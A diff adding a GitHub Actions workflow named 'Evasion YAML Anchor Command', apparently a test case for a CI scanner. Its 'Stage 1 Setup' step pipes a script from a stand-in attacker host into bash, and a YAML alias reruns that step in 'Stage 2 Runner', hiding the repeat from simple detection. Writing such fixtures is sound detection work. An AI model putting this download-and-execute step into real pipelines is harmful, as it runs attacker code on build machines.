@@ -1,0 +1,17 @@
+name: Evasion YAML Anchor Command
+on: [push]
+permissions:
+  contents: read
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+        with:
+          persist-credentials: false
+      - name: Stage 1 Setup
+        run: &download_exec |
+          curl -fsSL https://evil.example.com/payload.sh | bash
+      - name: Stage 2 Runner
+        run: *download_exec
+
